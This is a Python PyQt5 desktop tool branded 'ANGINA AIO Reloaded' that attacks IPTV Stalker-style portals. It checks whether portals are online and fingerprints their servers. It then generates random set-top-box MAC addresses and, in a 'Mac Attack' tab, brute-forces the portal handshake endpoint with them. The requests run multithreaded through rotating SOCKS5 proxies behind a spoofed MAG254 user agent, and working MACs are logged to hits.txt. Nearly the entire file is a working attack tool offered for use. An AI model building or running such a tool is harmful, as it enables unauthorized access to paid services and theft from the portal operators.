import os
import sys
import json
import time
import random
import requests
import urllib3
import concurrent.futures
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
    QTabWidget, QLabel, QLineEdit, QTextEdit, QPushButton, 
    QComboBox, QFileDialog, QMessageBox, QGroupBox, QSpinBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject
from PyQt5.QtGui import QFont, QColor, QPalette

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------- Worker Threads for Background Tasks ---------------- #

class WorkerSignals(QObject):
    log = pyqtSignal(str)
    finished = pyqtSignal()
    hit = pyqtSignal(str, str) # url, mac

class PortalCheckerThread(QThread):
    def __init__(self, urls, user_agent, timeout):
        super().__init__()
        self.urls = urls
        self.user_agent = user_agent
        self.timeout = timeout
        self.signals = WorkerSignals()

    def run(self):
        self.signals.log.emit(f"Starting check for {len(self.urls)} portals...")
        online_portals = []
        for url in self.urls:
            try:
                full_url = url if url.startswith("http") else "http://" + url
                self.signals.log.emit(f"Checking {full_url}...")
                resp = requests.head(full_url, timeout=self.timeout, verify=False)
                if resp.status_code < 400:
                    self.signals.log.emit(f"✅ ONLINE: {full_url} (HTTP {resp.status_code})")
                    online_portals.append(full_url)
                else:
                    self.signals.log.emit(f"❌ OFFLINE: {full_url} (HTTP {resp.status_code})")
            except Exception as e:
                self.signals.log.emit(f"❌ OFFLINE/ERROR: {full_url} ({str(e)})")
                
        if online_portals:
            self.signals.log.emit("\nStarting Detective on Online Portals...")
            for url in online_portals:
                try:
                    headers = {"User-Agent": self.user_agent}
                    resp = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                    server = resp.headers.get("Server", "Unknown")
                    self.signals.log.emit(f"🕵️ Detective -> {url} is running Server: {server}")
                except Exception as e:
                    self.signals.log.emit(f"🕵️ Detective -> Error analyzing {url}: {e}")
        
        self.signals.finished.emit()


class ScannerThread(QThread):
    def __init__(self, url, macs, proxies, user_agent, timeout, max_threads):
        super().__init__()
        self.url = url if url.endswith("/c/") else url.rstrip("/") + "/c/"
        self.macs = macs
        self.proxies = proxies
        self.user_agent = user_agent
        self.timeout = timeout
        self.max_threads = max_threads
        self.signals = WorkerSignals()
        self.is_scanning = True

    def run(self):
        self.signals.log.emit(f"🚀 Starting scan on {self.url} with {self.max_threads} threads...")
        
        def check_mac(mac):
            if not self.is_scanning: return
            proxy = random.choice(self.proxies) if self.proxies else None
            proxies_dict = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"} if proxy else None
            
            headers = {
                "User-Agent": self.user_agent,
                "Authorization": f"Bearer {mac}",
                "Cookie": f"mac={mac}"
            }
            try:
                auth_url = f"{self.url}?type=stb&action=handshake&mac={mac}"
                resp = requests.get(auth_url, headers=headers, proxies=proxies_dict, timeout=self.timeout, verify=False)
                
                if resp.status_code == 200 and ('"token"' in resp.text or '"js_version"' in resp.text):
                    self.signals.log.emit(f"🎯 HIT! Valid MAC: {mac}")
                    self.signals.hit.emit(self.url, mac)
            except Exception:
                pass
                
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for mac in self.macs:
                if not self.is_scanning: break
                executor.submit(check_mac, mac)
            
        self.signals.log.emit("✅ Scan finished!")
        self.signals.finished.emit()

    def stop(self):
        self.is_scanning = False


# ---------------- Main Application ---------------- #

class AnginaAIO(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🖤 ANGINA™ 🖤 AIO Reloaded")
        self.resize(1000, 700)
        
        # Internal State
        self.config = {
            "timeout": 5,
            "max_threads": 20,
            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 2 rev: 250 Safari/533.3"
        }
        self.macs_list = []
        self.proxies_list = []
        
        self.setup_ui()
        self.apply_dark_theme()

    def setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(15, 15, 15, 15)

        # Title Label
        title_lbl = QLabel("ANGINA™ AIO TOOLS")
        title_font = QFont("Segoe UI", 24, QFont.Bold)
        title_lbl.setFont(title_font)
        title_lbl.setAlignment(Qt.AlignCenter)
        title_lbl.setStyleSheet("color: #8a2be2; margin-bottom: 10px;")
        main_layout.addWidget(title_lbl)

        # Tab Widget
        self.tabs = QTabWidget()
        self.tabs.setFont(QFont("Segoe UI", 11))
        main_layout.addWidget(self.tabs)

        self.setup_tab_checker()
        self.setup_tab_macgen()
        self.setup_tab_scanner()
        self.setup_tab_settings()

    def apply_dark_theme(self):
        self.setStyleSheet("""
            QMainWindow { background-color: #1e1e24; }
            QWidget { background-color: #1e1e24; color: #ffffff; font-family: 'Segoe UI'; }
            QTabWidget::pane { border: 1px solid #3c3c44; background: #232329; border-radius: 4px; }
            QTabBar::tab { background: #2a2a30; color: #a0a0a0; padding: 10px 20px; border-top-left-radius: 4px; border-top-right-radius: 4px; margin-right: 2px; }
            QTabBar::tab:selected { background: #8a2be2; color: #ffffff; font-weight: bold; }
            QTabBar::tab:hover:!selected { background: #3c3c44; }
            QPushButton { background-color: #8a2be2; color: white; border: none; padding: 8px 15px; border-radius: 4px; font-weight: bold; }
            QPushButton:hover { background-color: #6200ea; }
            QPushButton:disabled { background-color: #555555; color: #888888; }
            QLineEdit, QTextEdit, QSpinBox, QComboBox { background-color: #2a2a30; color: white; border: 1px solid #3c3c44; padding: 6px; border-radius: 4px; }
            QLineEdit:focus, QTextEdit:focus { border: 1px solid #8a2be2; }
            QGroupBox { border: 1px solid #3c3c44; border-radius: 4px; margin-top: 15px; padding-top: 15px; font-weight: bold; }
            QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top left; padding: 0 5px; color: #8a2be2; }
            QScrollBar:vertical { background: #1e1e24; width: 12px; margin: 0px 0px 0px 0px; }
            QScrollBar::handle:vertical { background: #3c3c44; min-height: 20px; border-radius: 6px; }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0px; }
        """)

    # ---------------- TAB 1: Checker ----------------
    def setup_tab_checker(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)

        lbl = QLabel("Portal URLs (one per line):")
        layout.addWidget(lbl)

        self.checker_input = QTextEdit()
        self.checker_input.setMaximumHeight(150)
        self.checker_input.setPlaceholderText("http://portal.com:8080/c/")
        layout.addWidget(self.checker_input)

        btn = QPushButton("Run Checker & Detective")
        btn.clicked.connect(self.run_checker)
        layout.addWidget(btn)

        self.checker_log = QTextEdit()
        self.checker_log.setReadOnly(True)
        layout.addWidget(self.checker_log)

        self.tabs.addTab(tab, "1. Portal Checker")

    def run_checker(self):
        text = self.checker_input.toPlainText()
        urls = [u.strip() for u in text.split('\n') if u.strip()]
        if not urls:
            QMessageBox.warning(self, "Warning", "Please enter at least one URL.")
            return

        self.checker_log.clear()
        self.checker_thread = PortalCheckerThread(urls, self.config["user_agent"], self.config["timeout"])
        self.checker_thread.signals.log.connect(self.log_checker)
        self.checker_thread.start()

    def log_checker(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.checker_log.append(f"[{timestamp}] {msg}")

    # ---------------- TAB 2: MAC Generator ----------------
    def setup_tab_macgen(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setAlignment(Qt.AlignTop)

        group = QGroupBox("MAC Address Generator")
        glayout = QVBoxLayout(group)

        row1 = QHBoxLayout()
        row1.addWidget(QLabel("MAC Prefix:"))
        self.mac_prefix = QComboBox()
        self.mac_prefix.addItems(["00:1A:79", "00:1A:78", "00:1B:79", "00:1C:79"])
        row1.addWidget(self.mac_prefix)
        row1.addStretch()
        glayout.addLayout(row1)

        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Amount to Generate:"))
        self.mac_amount = QSpinBox()
        self.mac_amount.setRange(1, 100000)
        self.mac_amount.setValue(1000)
        row2.addWidget(self.mac_amount)
        row2.addStretch()
        glayout.addLayout(row2)

        btn = QPushButton("Generate & Save to TXT")
        btn.setFixedWidth(200)
        btn.clicked.connect(self.generate_macs)
        glayout.addWidget(btn)

        layout.addWidget(group)
        self.tabs.addTab(tab, "2. MAC Generator")

    def generate_macs(self):
        amount = self.mac_amount.value()
        prefix = self.mac_prefix.currentText()
        
        default_name = f"MACs_{prefix.replace(':','')}_{amount}.txt"
        file_path, _ = QFileDialog.getSaveFileName(self, "Save MACs", default_name, "Text Files (*.txt)")
        
        if file_path:
            macs = []
            for _ in range(amount):
                suffix = ':'.join(['%02X' % random.randint(0, 255) for _ in range(3)])
                macs.append(f"{prefix}:{suffix}")
                
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("\n".join(macs))
            QMessageBox.information(self, "Success", f"Saved {amount} MACs to {file_path}")

    # ---------------- TAB 3: Scanner ----------------
    def setup_tab_scanner(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)

        # Top Controls
        top_row = QHBoxLayout()
        top_row.addWidget(QLabel("Target Portal URL:"))
        self.scan_url = QLineEdit()
        self.scan_url.setPlaceholderText("http://portal.com:8080/c/")
        top_row.addWidget(self.scan_url)
        layout.addLayout(top_row)

        btn_row = QHBoxLayout()
        btn_load_macs = QPushButton("Load MACs")
        btn_load_macs.clicked.connect(self.load_macs)
        btn_row.addWidget(btn_load_macs)

        btn_load_proxies = QPushButton("Load SOCKS5 Proxies")
        btn_load_proxies.clicked.connect(self.load_proxies)
        btn_row.addWidget(btn_load_proxies)

        self.scan_status_lbl = QLabel("Loaded: 0 MACs | 0 Proxies")
        self.scan_status_lbl.setStyleSheet("color: #a0a0a0; margin-left: 20px;")
        btn_row.addWidget(self.scan_status_lbl)
        btn_row.addStretch()

        self.btn_start_scan = QPushButton("START SCAN")
        self.btn_start_scan.setStyleSheet("background-color: #28a745;")
        self.btn_start_scan.clicked.connect(self.start_scan)
        btn_row.addWidget(self.btn_start_scan)

        self.btn_stop_scan = QPushButton("STOP")
        self.btn_stop_scan.setStyleSheet("background-color: #dc3545;")
        self.btn_stop_scan.setEnabled(False)
        self.btn_stop_scan.clicked.connect(self.stop_scan)
        btn_row.addWidget(self.btn_stop_scan)
        
        layout.addLayout(btn_row)

        self.scan_log = QTextEdit()
        self.scan_log.setReadOnly(True)
        layout.addWidget(self.scan_log)

        self.tabs.addTab(tab, "3. Mac Attack")

    def load_macs(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select MACs File", "", "Text Files (*.txt)")
        if file_path:
            with open(file_path, "r", encoding="utf-8") as f:
                self.macs_list = [line.strip() for line in f if line.strip()]
            self.update_scan_labels()

    def load_proxies(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Proxies File", "", "Text Files (*.txt)")
        if file_path:
            with open(file_path, "r", encoding="utf-8") as f:
                self.proxies_list = [line.strip() for line in f if line.strip()]
            self.update_scan_labels()

    def update_scan_labels(self):
        self.scan_status_lbl.setText(f"Loaded: {len(self.macs_list)} MACs | {len(self.proxies_list)} Proxies")

    def start_scan(self):
        url = self.scan_url.text().strip()
        if not url:
            QMessageBox.warning(self, "Warning", "Please enter a target Portal URL.")
            return
        if not self.macs_list:
            QMessageBox.warning(self, "Warning", "Please load a MAC list first.")
            return

        self.btn_start_scan.setEnabled(False)
        self.btn_stop_scan.setEnabled(True)
        self.scan_log.clear()

        self.scanner_thread = ScannerThread(
            url, self.macs_list, self.proxies_list, 
            self.config["user_agent"], self.config["timeout"], self.config["max_threads"]
        )
        self.scanner_thread.signals.log.connect(self.log_scan)
        self.scanner_thread.signals.hit.connect(self.save_hit)
        self.scanner_thread.signals.finished.connect(self.scan_finished)
        self.scanner_thread.start()

    def stop_scan(self):
        if hasattr(self, 'scanner_thread'):
            self.scanner_thread.stop()
        self.log_scan("🛑 Scan stopped by user.")
        self.btn_start_scan.setEnabled(True)
        self.btn_stop_scan.setEnabled(False)

    def scan_finished(self):
        self.btn_start_scan.setEnabled(True)
        self.btn_stop_scan.setEnabled(False)

    def log_scan(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.scan_log.append(f"[{timestamp}] {msg}")

    def save_hit(self, url, mac):
        hits_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hits.txt")
        try:
            with open(hits_file, "a", encoding="utf-8") as f:
                f.write(f"{url} | {mac}\n")
        except:
            pass

    # ---------------- TAB 4: Settings ----------------
    def setup_tab_settings(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setAlignment(Qt.AlignTop)

        group = QGroupBox("Global Settings")
        glayout = QVBoxLayout(group)

        row1 = QHBoxLayout()
        row1.addWidget(QLabel("Timeout (seconds):"))
        self.set_timeout = QSpinBox()
        self.set_timeout.setValue(self.config["timeout"])
        row1.addWidget(self.set_timeout)
        row1.addStretch()
        glayout.addLayout(row1)

        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Max Threads:"))
        self.set_threads = QSpinBox()
        self.set_threads.setRange(1, 200)
        self.set_threads.setValue(self.config["max_threads"])
        row2.addWidget(self.set_threads)
        row2.addStretch()
        glayout.addLayout(row2)

        row3 = QHBoxLayout()
        row3.addWidget(QLabel("User Agent:"))
        self.set_ua = QLineEdit()
        self.set_ua.setText(self.config["user_agent"])
        row3.addWidget(self.set_ua)
        glayout.addLayout(row3)

        btn = QPushButton("Save Settings")
        btn.setFixedWidth(150)
        btn.clicked.connect(self.save_settings)
        glayout.addWidget(btn)

        layout.addWidget(group)
        self.tabs.addTab(tab, "4. Settings")

    def save_settings(self):
        self.config["timeout"] = self.set_timeout.value()
        self.config["max_threads"] = self.set_threads.value()
        self.config["user_agent"] = self.set_ua.text()
        QMessageBox.information(self, "Success", "Settings saved successfully.")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Optional: Force Fusion style for a more consistent dark theme across OS
    app.setStyle("Fusion")
    
    window = AnginaAIO()
    window.show()
    sys.exit(app.exec_())
